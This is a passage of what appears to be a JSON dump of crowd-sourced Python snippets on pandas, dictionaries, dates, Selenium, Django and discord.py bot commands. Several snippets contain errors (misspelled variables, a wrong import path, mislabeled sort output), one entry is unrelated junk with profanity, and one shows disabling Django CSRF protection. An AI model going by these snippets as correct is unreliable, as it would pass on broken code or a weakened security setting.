    "description": "In [5]: df = pd.DataFrame({'a':[1,2,np.nan], 'b':[np.nan,1,np.nan]})  In [6]: df.isna().sum() Out[6]: a    1 b    2 dtype: int64\n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 807,
    "keyword": null,
    "link": null,
    "title": " df drop column",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf.drop(columns=['B', 'C'])\nnote: df is your dataframe  df = df.drop('coloum_name',axis=1)\ndf = df.drop(['B', 'C'], axis=1)\n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 808,
    "keyword": null,
    "link": null,
    "title": " df dropna ensure that one column is not nan",
    "description": "df = df[df['EPS'].notna()]\n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 809,
    "keyword": null,
    "link": null,
    "title": " df iterrows pandas",
    "description": "for index, row in df.iterrows():     print(row['c1'], row['c2'])  Output:     10 100    11 110    12 120\nimport pandas as pd import numpy as np  df = pd.DataFrame({'c1': [10, 11, 12], 'c2': [100, 110, 120]})  for index, row in df.iterrows():     print(row['c1'], row['c2'])\n>>> df = pd.DataFrame([[1, 1.5]], columns=['int', 'float']) >>> row = next(df.iterrows())[1] >>> row int      1.0 float    1.5 Name: 0, dtype: float64 >>> print(row['int'].dtype) float64 >>> print(df['int'].dtype) int64 \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 810,
    "keyword": null,
    "link": null,
    "title": " df select first n rows",
    "description": "df2 = df.head(N) # this should select N rows from top and copy to new df df3 = df.tail(N) # this should select N rows from bottom and copy to new df \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 811,
    "keyword": null,
    "link": null,
    "title": " df sort values",
    "description": ">>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n>>> df.sort_values(by=['col1'], ascending = False)     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \ndf.rename(columns={1:'month'},inplace=True) df['month'] = pd.Categorical(df['month'],categories=['December','November','October','September','August','July','June','May','April','March','February','January'],ordered=True) df = df.sort_values('month',ascending=False)\ndf.sort_values(by=['col1'], ascending = True)\n>>> df = pd.DataFrame({ ...     'col1': ['A', 'A', 'B', np.nan, 'D', 'C'], ...     'col2': [2, 1, 9, 8, 7, 4], ...     'col3': [0, 1, 9, 4, 2, 3], ...     'col4': ['a', 'B', 'c', 'D', 'e', 'F'] ... }) >>> df   col1  col2  col3 col4 0    A     2     0    a 1    A     1     1    B 2    B     9     9    c 3  NaN     8     4    D 4    D     7     2    e 5    C     4     3    F   df.sort_values(by=['col1'])   col1  col2  col3 col4 0    A     2     0    a 1    A     1     1    B 2    B     9     9    c 5    C     4     3    F 4    D     7     2    e 3  NaN     8     4    D\n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 812,
    "keyword": null,
    "link": null,
    "title": " diagonal difference hackerrank python",
    "description": "prim =0     sec=0     length = len(arr[0])     for count in range(length):         prim += arr[count][count]         sec += arr[count][(length-count-1)]     return abs(prim-sec)     \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 813,
    "keyword": null,
    "link": null,
    "title": " dich",
    "description": "what the fuck you're looking at??\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n Le nombre (&agrave; 20 %) augmente r&eacute;guli&egrave;rement\ncout<< \"Anh t&uacute;\"\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 814,
    "keyword": null,
    "link": null,
    "title": " dict from two lists",
    "description": ">>> keys = ['a', 'b', 'c'] >>> values = [1, 2, 3] >>> dictionary = dict(zip(keys, values)) >>> print(dictionary) {'a': 1, 'b': 2, 'c': 3}\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 815,
    "keyword": null,
    "link": null,
    "title": " dict to excel without external library",
    "description": "import pandas as pd  dict1 = {\"number of storage arrays\": 45, \"number of ports\":2390}  df = pd.DataFrame(data=dict1, index=[0])  df = (df.T)  print (df)  df.to_excel('dict1.xlsx')\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 816,
    "keyword": null,
    "link": null,
    "title": " dictionaries to http data python",
    "description": "dictionary = {\"a\":2,\"b\":3,\"kirekhar\":\"kireasb\"}  #WAY NUMBER ONE: result = \"\" for key,val in zip(dic.keys(),dic.values()): \tresult+=key+\"=\"+str(val)+\";\" print(result) # OUTPUT : 'a=2;b=3;kirekhar=kireasb;' requests.post(url, data=result)  #WAY NUMBER TWO: import json requests.post(url, data=json.dumps(dictionary))  #WAY NUMBER THREE: requests.post(url, json=dictionary)\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 817,
    "keyword": null,
    "link": null,
    "title": " dictionary from two columns pandas",
    "description": "pd.Series(df.A.values,index=df.B).to_dict()\nIn [9]: pd.Series(df.Letter.values,index=df.Position).to_dict() Out[9]: {1: 'a', 2: 'b', 3: 'c', 4: 'd', 5: 'e'} \nIn [6]: df = pd.DataFrame(randint(0,10,10000).reshape(5000,2),columns=list('AB'))  In [7]: %timeit dict(zip(df.A,df.B)) 1000 loops, best of 3: 1.27 ms per loop  In [8]: %timeit pd.Series(df.A.values,index=df.B).to_dict() 1000 loops, best of 3: 987 us per loop\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 818,
    "keyword": null,
    "link": null,
    "title": " dictionary from two lists",
    "description": ">>> keys = ['a', 'b', 'c'] >>> values = [1, 2, 3] >>> dictionary = dict(zip(keys, values)) >>> print(dictionary) {'a': 1, 'b': 2, 'c': 3}\n#initialize lists  key_list = ['red', 'green', 'blue'] value_list = [1, 2, 3]  #convert lists  my_dict = {}  for key in key_list:      for value in value_list:          my_dict[key] = value          value_list.remove(value)          break   print(my_dict) \n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 819,
    "keyword": null,
    "link": null,
    "title": " dictionary in python does not support append operation",
    "description": "dict_append = {\"1\" : \"Python\", \"2\" : \"Java\"} dict_append.update({\"3\":\"C++\"})  # append doesn't supported in dict  \t\t\t\t\t\t\t\t # instead , use update in dict print(dict_append) # output : {'1': 'Python', '2': 'Java', '3': 'C++'}\ndict = {1 : 'one', 2 : 'two'} # Print out the dict print(dict) # Add something to it dict[3] = 'three' # Print it out to see it has changed print(dict)\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 820,
    "keyword": null,
    "link": null,
    "title": " dictionary with alphabet python",
    "description": "alphabet = {         'a' : '1',          'b' : '2',          'c' : '3',          'd' : '4',          'e' : '5',          'f' : '6',          'g' : '7',          'h' : '8',          'i' : '9',          'j' : '10',          'k' : '11',          'l' : '12',          'm' : '13',          'n' : '14',          'o' : '15',          'p' : '16',          'q' : '17',          'r' : '18',          's' : '19',          't' : '20',          'u' : '21',          'v' : '22',          'w' : '23',          'x' : '24',          'y' : '25',          'z' : '26'     }\n    alphabet = {         'a' : 0,          'b' : 0,          'c' : 0,          'd' : 0,          'e' : 0,          'f' : 0,          'g' : 0,          'h' : 0,          'i' : 0,          'j' : 0,          'k' : 0,          'l' : 0,          'm' : 0,          'n' : 0,          'o' : 0,          'p' : 0,          'q' : 0,          'r' : 0,          's' : 0,          't' : 0,          'u' : 0,          'v' : 0,          'w' : 0,          'x' : 0,          'y' : 0,          'z' : 0     }\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 821,
    "keyword": null,
    "link": null,
    "title": " dictionary with numbers python",
    "description": "    dict = {1:\"one\",             2:\"two\",             3:\"three\",             4:\"four\",             5:\"five\",             6:\"six\",             7:\"seven\",             8:\"eight\",             9:\"nine\",             0:\"zero\",            }\n",
    "reg_date": "2021-10-12T11:28:52.000Z"
  },
  {
    "id": 822,
    "keyword": null,
    "link": null,
    "title": " difference between two dates in days python",
    "description": "from datetime import date d0 = date(2017, 8, 18) d1 = date(2017, 10, 26) delta = d1 - d0 print(delta.days)\nfrom datetime import datetime, timedelta  def date_range(start, end):     delta = end - start  # as timedelta     days = [start + timedelta(days=i) for i in range(delta.days + 1)]     return days  start_date = datetime(2008, 8, 1) end_date = datetime(2008, 8, 3)      print(date_range(start_date, end_date))\nfrom datetime import date, timedelta  sdate = date(2008, 8, 15)   # start date edate = date(2008, 9, 15)   # end date  delta = edate - sdate       # as timedelta  for i in range(delta.days + 1):     day = sdate + timedelta(days=i)     print(day)\nfrom datetime import date f_date = date(2014, 7, 2) l_date = date(2014, 7, 11) delta = l_date - f_date print(delta.days)  \n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 823,
    "keyword": null,
    "link": null,
    "title": " diploma",
    "description": "print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 824,
    "keyword": null,
    "link": null,
    "title": " directory name python",
    "description": "# Directory name from path of file import os file_name = \"/home/ubuntu/Project/demo.txt\" dir_name = os.path.dirname(file_name) print(dir_name)\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 825,
    "keyword": null,
    "link": null,
    "title": " dirs' base dir / 'templates' error",
    "description": "Incorrect syntax in polls app tutorial by Django  Use this:  os.path.join(BASE_DIR, 'templates')  instead of this: BASE_DIR / 'templates'  TEMPLATES = [     {         'BACKEND': 'django.template.backends.django.DjangoTemplates',         'DIRS': [os.path.join(BASE_DIR, 'templates')],         'APP_DIRS': True,         'OPTIONS': {             'context_processors': [                 # codes...             ],         },     }, ]\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 826,
    "keyword": null,
    "link": null,
    "title": " disable DevTools listening on ws://127.0.0.1 python",
    "description": "options = webdriver.ChromeOptions() options.add_experimental_option('excludeSwitches', ['enable-logging']) driver = webdriver.Chrome(executable_path='<path-to-chrome>', options=options) \n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 827,
    "keyword": null,
    "link": null,
    "title": " disable csrf for one url django",
    "description": "from django.views.decorators.csrf import csrf_exempt  @csrf_exempt def xyx(request):   #your code    #this makes the function accept post request without csrf token #use it just for quick check or for operations where csrftoken authentication #isn't required\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 828,
    "keyword": null,
    "link": null,
    "title": " disable images selenium python",
    "description": "from selenium import webdriver  chrome_options = webdriver.ChromeOptions() prefs = {\"profile.managed_default_content_settings.images\": 2} chrome_options.add_experimental_option(\"prefs\", prefs) driver = webdriver.Chrome(chrome_options=chrome_options) \n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 829,
    "keyword": null,
    "link": null,
    "title": " discord.py \"NameError: name 'has permissions' is not defined\"",
    "description": "# Make sure you import 'commands' from discord.exp import commands  # Also try to put your \"@has_permissions\" starts with \"commands.\" @commands.has_permissions(administrator=True) async def function(ctx, prefix):   pass\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 830,
    "keyword": null,
    "link": null,
    "title": " discord.py add reaction to message",
    "description": "#1 message = ctx.send(\"text\") #2 message = channel.send(\"text\") #3 message = channel.fetch_message(messageid) #add reaction to message emoji = '\\N{THUMBS UP SIGN}' await message.add_reaction(emoji)\nawait message.add_reaction(emoji)\n#Get reactions from cached msg cache_msg = discord.utils.get(client.cached_messages, id=msg.id) n_players = await cache_msg.reactions[0].users().flatten() n_players = n_players[1:]\n",
    "reg_date": "2021-10-12T11:28:53.000Z"
  },
  {
    "id": 831,
    "keyword": null,
    "link": null,
    "title": " discord.py add role on member join",
    "description": "intents = discord.Intents.default() intents.members = True client = commands.Bot(command_prefix=',', intents=intents)  @client.event  async def on_member_join(member):   role = get(member.guild.roles, id=role_id)   await member.add_roles(role) \n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 832,
    "keyword": null,
    "link": null,
    "title": " discord.py aliases",
    "description": "@commands.command(name='test', aliases=['testcommand', 'testing']) async def test(self, ctx):     await ctx.send(\"This a test command\")  #will run with either 'test, testcommand or testing\n@commands.command(aliases=['testcommand', 'testing']) async def test(self, ctx):     await ctx.send(\"This a test command\") \n@bot.command() @commands.has_role('RoleName') async def command_name():\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 833,
    "keyword": null,
    "link": null,
    "title": " discord.py ban",
    "description": "@commands.command() # uses command decorators, in this case inside a cog @commands.has_permissions(ban_members=True) # only people that have permissions to ban users can use this command async def ban(self, ctx, user: discord.Member, *, reason): # The person banning someone has to ping the user to ban, and input a reason. Remove self if you are outside a cog.     await ctx.guild.ban(user, reason=reason) # Bans the user.     await user.send(f\"You have been banned in {ctx.guild} for {reason}\") # Private messages user.     await ctx.send(f\"{user} has been successfully banned.\") # messages channel to tell everyone it worked\n#this was in a cog    # The below code bans player. @commands.command() @commands.has_permissions(ban_members=True)   async def ban(self, ctx, member: discord.Member, *, reason=None):      await member.ban(reason=reason)      await ctx.send(f'User {member} has been kick')  # The below code unbans player. @commands.command() @commands.has_permissions(administrator=True)   async def unban(self, ctx, *, member):      banned_users = await ctx.guild.bans()      member_name, member_discriminator = member.split(\"#\")          for ban_entry in banned_users:             user = ban_entry.user              if (user.name, user.discriminator) == (member_name, member_discriminator):                 await ctx.guild.unban(user)                 await ctx.send(f'Unbanned {user.mention}')                 return  # The below code kicks player @commands.command() @commands.has_permissions(kick_members=True)     async def kick(self, ctx, member: discord.Member, *, reason=None):         await member.kick(reason=reason)         await ctx.send(f'User {member} has been kick')\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 834,
    "keyword": null,
    "link": null,
    "title": " discord.py basic command",
    "description": "#If you havent already install discord.py using pip install discord.py #Then import discord #Then Import commands import discord from discord.ext import commands #Create your bot instinct #With the bot Prefix set to ! #You can change it to your choice client = commands.Bot(command_prefix='!') client.remove_command('help') #This is an event when the bot logs in this help to check if  #the bot is running correctly @client.event async def on_ready():     print('Logged on as Stars Bot') #This is a basic commad that returns the bots ping @client.command() async def ping(ctx):     await ctx.send(f'Ping is `{round(client.latency * 1000)}` ms ') #Change the Your token here with the token found in your discord developer portal #https://discord.com/developers/applications here is a link  client.run('Your Token here')\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 835,
    "keyword": null,
    "link": null,
    "title": " discord.py bot notification youtube script",
    "description": "import discord import time import asyncio import sys from Implementation import YouTuber from config import Config  config = Config('config.yml') client = discord.Client() youtubers = config.getYouTubersList() if (config.getYouTubersNr() != 0) else sys.exit() if (config.getDiscordChannelNr() == 0): sys.exit() id = '' GOOGLE_API = config.getConnectionData()[0] pingEveryXMinutes = config.getPingTime() threads = [] processes = []  i = 0 while i < config.getYouTubersNr():     temp_list = []     temp_list.append(config.getYouTubersList()[i]['name'])     temp_list.append(id) if not config.getYouTubersList()[i]['channelID'] else temp_list.append(config.getYouTubersList()[i]['channelID'])     temp_list.append(True) if not id else temp_list.append(False)     temp_list.append('')     threads.append(temp_list)     i += 1  i = 0  while i < config.getYouTubersNr():     processes.append(YouTuber(GOOGLE_API, threads[i][1], threads[i][2]))     i += 1  async def update():     while True:         try:             waittime = pingEveryXMinutes * 60             item = 0             while item < config.getYouTubersNr():                 data = processes[item].update()                 print('Checking for new videos from {}'.format(threads[item][0]))                 if processes[item].isNewVideo():                     print('{} HAS UPLOADED A NEW VIDEO! PUSHING UPDATE ON DISCORD.'.format(threads[item][0]))                     for x in range (0, config.getDiscordChannelNr()):                         newvideo = config.getDiscordChannelList()[x]['New video'].format(threads[item][0]) + '\\n{}'.format(processes[item].getVideoLink(processes[item].videosData[0][1]))                         await client.send_message(client.get_channel(str(config.getDiscordChannelList()[x]['channelID'])), newvideo)                  if processes[item].isUserLive():                     if not processes[item].liveId == threads[item][3]:                         print('{} IS LIVESTREAMING NOW! PUSHING UPDATE ON DISCORD.'.format(threads[item][0]))                         threads[item][3] = processes[item].liveId                         for x in range (0, config.getDiscordChannelNr()):                             livestream = config.getDiscordChannelList()[x]['Livestream'].format(threads[item][0]) + '\\n{}'.format(processes[item].getVideoLink(processes[item].getUserLiveData()))                             await client.send_message(client.get_channel(str(config.getDiscordChannelList()[x]['channelID'])), livestream)                 item += 1         except:             pass         while waittime > 0:             mins, secs = divmod(waittime, 60)             timeformat = '{:02d}:{:02d}'.format(mins, secs)             sys.stdout.write('Rechecking in ' + str(timeformat) + '\\r')             waittime -= 1             await asyncio.sleep(1)  @client.event async def on_ready():     print('Logged in as:')     print(client.user.name)     print(client.user.id)     print('---------------------------------------')     print('Bot running.')     asyncio.ensure_future(update())  client.run(config.getConnectionData()[1])\nfollow this https://discordpy.readthedocs.io/en/latest/discord.html to make bot account  use discord api of your laugaungue of choice discord.py https://discordpy.readthedocs.io/en/latest/index.html discord.js  https://discord.js.org/#/ \n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 836,
    "keyword": null,
    "link": null,
    "title": " discord.py change status",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n# Playing ____ await bot.change_presence(activity=discord.Game(name='Minecraft')) # Streaming ____ await bot.change_presence(activity=discord.Streaming(name=\"Chess\", url=twitch_url)) # Watching ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"Harry Potter\")) # Competing in ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name=\"the House Cup\")) # Listening to ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"!help\"))\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 837,
    "keyword": null,
    "link": null,
    "title": " discord.py check if user has role",
    "description": "    @bot.command(pass_context=True)     @commands.has_role(\"Admin\")     async def unmute(ctx, user: discord.Member):         role = discord.utils.find(lambda r: r.name == 'Member', ctx.message.server.roles)         if role in user.roles:             await bot.say(\"{} is not muted\".format(user))         else:             await bot.add_roles(user, role) \n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 838,
    "keyword": null,
    "link": null,
    "title": " discord.py clear command",
    "description": "@client.command() async def clear(ctx, amount=5): \tawait ctx.channel.purge(limit=ammount)\n@bot.command() async def clear(ctx, amount=5): \tawait ctx.channel.purge(limit=amount)  or  @client.command() async def clear(ctx, amount=5): \tawait ctx.channel.purge(limit=amount)\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 839,
    "keyword": null,
    "link": null,
    "title": " discord.py commands.group",
    "description": "@bot.group() async def git(ctx):     if ctx.invoked_subcommand is None:         await ctx.send('Invalid git command passed...')  @git.command() async def push(ctx, remote: str, branch: str):     await ctx.send('Pushing to {} {}'.format(remote, branch))\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 840,
    "keyword": null,
    "link": null,
    "title": " discord.py create text channel",
    "description": "@client.command() async def create_channel(ctx, channel_name): \tguild = ctx.guild \tchannel = await guild.create_text_channel(channel_name)\n",
    "reg_date": "2021-10-12T11:28:54.000Z"
  },
  {
    "id": 841,
    "keyword": null,
    "link": null,
    "title": " discord.py dm specific user",
    "description": "    if message.content == \"dm\":         await message.channel.send(\"Dming user\")         dm = await message.author.create_dm()  # Creates a dm channel with the user         await dm.send(\"What you want to send\")  # Sends the user the message\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 842,
    "keyword": null,
    "link": null,
    "title": " discord.py how to give a user a role",
    "description": "# If ctx is not defined and you are handling a message, use this code ctx = await bot.get_context(message)  # This is the code needed to give a user a role member = ctx.message.author # Member object that you want to add the role to role = discord.utils.get(lambda role: role.name == \"Role Name\", ctx.guild.roles) # The role object await member.add_roles(role) # Adds the role to the member\nmember = message.author var = discord.utils.get(message.guild.roles, name = \"role name\") member.add_role(var)\n@client.command(aliases=['make_role']) @commands.has_permissions(manage_roles=True) # Check if the user executing the command can manage roles async def create_role(ctx, *, name): \tguild = ctx.guild \tawait guild.create_role(name=name) \tawait ctx.send(f'Role `{name}` has been created')\nguild = ctx.guild await guild.create_role(name=\"role name\") \n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 843,
    "keyword": null,
    "link": null,
    "title": " discord.py kick and ban command",
    "description": "#this was in a cog    # The below code bans player. @commands.command() @commands.has_permissions(ban_members=True)   async def ban(self, ctx, member: discord.Member, *, reason=None):      await member.ban(reason=reason)      await ctx.send(f'User {member} has been kick')  # The below code unbans player. @commands.command() @commands.has_permissions(administrator=True)   async def unban(self, ctx, *, member):      banned_users = await ctx.guild.bans()      member_name, member_discriminator = member.split(\"#\")          for ban_entry in banned_users:             user = ban_entry.user              if (user.name, user.discriminator) == (member_name, member_discriminator):                 await ctx.guild.unban(user)                 await ctx.send(f'Unbanned {user.mention}')                 return  # The below code kicks player @commands.command() @commands.has_permissions(kick_members=True)     async def kick(self, ctx, member: discord.Member, *, reason=None):         await member.kick(reason=reason)         await ctx.send(f'User {member} has been kick')\nimport asyncio import random from asyncio.windows_events import NULL import discord from discord.embeds import Embed from discord.ext import commands from discord.ext.commands import has_permissions from discord.ext.commands import has_permissions, CheckFailure from discord.ext.commands import has_permissions, MissingPermissions import os import time import typing from discord.ext import commands, tasks from discord.errors import Forbidden from discord.ext.commands.bot import Bot    @bot.command() @has_permissions(ban_members=True) async def ban(ctx, member: discord.Member, *, reason=None):     username_1 = ctx.message.author.name     avatar_1 = ctx.message.author.avatar_url     await member.ban(reason=reason)     embed=discord.Embed(title=f'User {member} has been kick')     embed.set_author(name=f\"requested by {username_1}\", icon_url=avatar_1)     await ctx.send(embed=embed)   @bot.command() @has_permissions(administrator=True) async def unban(ctx, *, member):     username_1 = ctx.message.author.name     avatar_1 = ctx.message.author.avatar_url          banned_users = await ctx.guild.bans()     member_name, member_discriminator = member.split(\"#\")          for ban_entry in banned_users:         user = ban_entry.user          if (user.name, user.discriminator) == (member_name, member_discriminator):             await ctx.guild.unban(user)             embed=discord.Embed(title=f'Unbanned {user.mention}')             embed.set_author(name=f\"requested by {username_1}\", icon_url=avatar_1)             await ctx.send(embed=embed)             return   @bot.command() @has_permissions(kick_members=True) async def kick(ctx, member: discord.Member, *, reason=None):     username_1 = ctx.message.author.name     avatar_1 = ctx.message.author.avatar_url     await member.kick(reason=reason)     embed=discord.Embed(title=f'User {member} has been kick')     embed.set_author(name=f\"requested by {username_1}\", icon_url=avatar_1)     await ctx.send(embed=embed)\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 844,
    "keyword": null,
    "link": null,
    "title": " discord.py leveling system",
    "description": "@client.event async def on_member_join(member):     with open('users.json', 'r') as f:         users = json.load(f)      await update_data(users, member)      with open('users.json', 'w') as f:         json.dump(users, f)   @client.event async def on_message(message):     if message.author.bot == False:         with open('users.json', 'r') as f:             users = json.load(f)          await update_data(users, message.author)         await add_experience(users, message.author, 5)         await level_up(users, message.author, message)          with open('users.json', 'w') as f:             json.dump(users, f)      await client.process_commands(message)   async def update_data(users, user):     if not f'{user.id}' in users:         users[f'{user.id}'] = {}         users[f'{user.id}']['experience'] = 0         users[f'{user.id}']['level'] = 1   async def add_experience(users, user, exp):     users[f'{user.id}']['experience'] += exp   async def level_up(users, user, message):     with open('levels.json', 'r') as g:         levels = json.load(g)     experience = users[f'{user.id}']['experience']     lvl_start = users[f'{user.id}']['level']     lvl_end = int(experience ** (1 / 4))     if lvl_start < lvl_end:         await message.channel.send(f'{user.mention} has leveled up to level {lvl_end}')         users[f'{user.id}']['level'] = lvl_end  @client.command() async def level(ctx, member: discord.Member = None):     if not member:         id = ctx.message.author.id         with open('users.json', 'r') as f:             users = json.load(f)         lvl = users[str(id)]['level']         await ctx.send(f'You are at level {lvl}!')     else:         id = member.id         with open('users.json', 'r') as f:             users = json.load(f)         lvl = users[str(id)]['level']         await ctx.send(f'{member} is at level {lvl}!')\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 845,
    "keyword": null,
    "link": null,
    "title": " discord.py make command admin only",
    "description": "# Make sure you don't have a command called \"commands\" @client.command() # As usual @commands.has_permissions(administrator=True) # Making sure the person executing the command has the permissions async def foo(ctx): \tawait ctx.send(\"Hello\")     #ect\n@commands.has_permissions(administrator=True) @client.command()  async def admins_only_command(ctx, *, args):     # ur code\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 846,
    "keyword": null,
    "link": null,
    "title": " discord.py making a bot join",
    "description": "@bot.command() async def join(ctx):     channel = ctx.author.voice.channel     await channel.connect() @bot.command() async def leave(ctx):     await ctx.voice_client.disconnect()\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 847,
    "keyword": null,
    "link": null,
    "title": " discord.py mute",
    "description": "@client.command(description=\"Unmutes a specified user.\") @commands.has_permissions(manage_messages=True) async def unmute(ctx, member: discord.Member):    mutedRole = discord.utils.get(ctx.guild.roles, name=\"Muted\")     await member.remove_roles(mutedRole)    await member.send(f\" you have unmutedd from: - {ctx.guild.name}\")    embed = discord.Embed(title=\"unmute\", description=f\" unmuted-{member.mention}\",colour=discord.Colour.light_gray())    await ctx.send(embed=embed)\n@client.command(description=\"Mutes the specified user.\") @commands.has_permissions(manage_messages=True) async def mute(ctx, member: discord.Member, *, reason=None):     guild = ctx.guild     mutedRole = discord.utils.get(guild.roles, name=\"Muted\")      if not mutedRole:         mutedRole = await guild.create_role(name=\"Muted\")          for channel in guild.channels:             await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)     embed = discord.Embed(title=\"muted\", description=f\"{member.mention} was muted \", colour=discord.Colour.light_gray())     embed.add_field(name=\"reason:\", value=reason, inline=False)     await ctx.send(embed=embed)     await member.add_roles(mutedRole, reason=reason)     await member.send(f\" you have been muted from: {guild.name} reason: {reason}\") \n#Timed mute this format: 1d, 20s, 30m, etc.. @bot.command(aliases=['tempmute']) @commands.has_permission(manage_messages=True) async def mute(ctx, member: discord.Member=None, time=None, *, reason=None): if not member: \tawait ctx.send(\"You must mention a member to mute!\") elif not time: \tawait ctx.send(\"You must mention a time!\") else: \tif not reason:    \t\treason=\"No reason given\"     #Now timed mute manipulation     try:     \tseconds = time[:-1] #Gets the numbers from the time argument, start to -1         duration = time[-1] #Gets the timed maniulation, s, m, h, d         if duration == \"s\":         \tseconds = seconds * 1         elif duration == \"m\":         \tseconds = seconds * 60         elif duration == \"h\":         \tseconds = seconds * 60 * 60         elif duration == \"d\":         \tseconds = seconds * 86400         else:         \tawait ctx.send(\"Invalid duration input\")           \treturn     except Exception as e:     \tprint(e)         await ctx.send(\"Invalid time input\")         return     guild = ctx.guild    \tMuted = discord.utils.get(guild.roles, name=\"Muted\")     if not Muted:     \tMuted = await guild.create_role(name=\"Muted\")         for channel in guild.channels:         await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)     await member.add_roles(Muted, reason=reason)     muted_embed = discord.Embed(title=\"Muted a user\", description=f\"{member.mention} Was muted by {ctx.author.mention} for {reason} to {time}\")     await ctx.send(embed=muted_embed)     await asyncio.sleep(seconds)   \tawait member.remove_roles(Muted)     unmute_embed = discord.Embed(title=\"Mute over!\", description=f'{ctx.author.mention} muted to {member.mention} for {reason} is over after {time}\")     await ctx.send(embed=unmute_embed)\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 848,
    "keyword": null,
    "link": null,
    "title": " discord.py on command error",
    "description": "@client.event() #Replace 'client' with whatever neccesary async def on_command_error(ctx, error):   if isinstance(error, commands.MissingRequiredArguments):     # Replace MissingRequiredArguments with your error     ctx.send(\"Please pass all required arguments\")\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 849,
    "keyword": null,
    "link": null,
    "title": " discord.py owner only commands",
    "description": "# Make sure you don't have a command called \"commands\" @client.command() # As usual @commands.is_owner() # Making sure the person executing the command is the owner async def foo(ctx): \tawait ctx.send(\"Hello\")     #ect\n",
    "reg_date": "2021-10-12T11:28:55.000Z"
  },
  {
    "id": 850,
    "keyword": null,
    "link": null,
    "title": " discord.py play mp3 file",
    "description": "@bot.command(aliases=['paly', 'queue', 'que']) async def play(ctx):     guild = ctx.guild     voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=guild)     audio_source = discord.FFmpegPCMAudio('vuvuzela.mp3')     if not voice_client.is_playing():         voice_client.play(audio_source, after=None)\nIf you want to make a serious bot try Lavalink: https://github.com/Devoxin/Lavalink.py\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 851,
    "keyword": null,
    "link": null,
    "title": " discord.py presence",
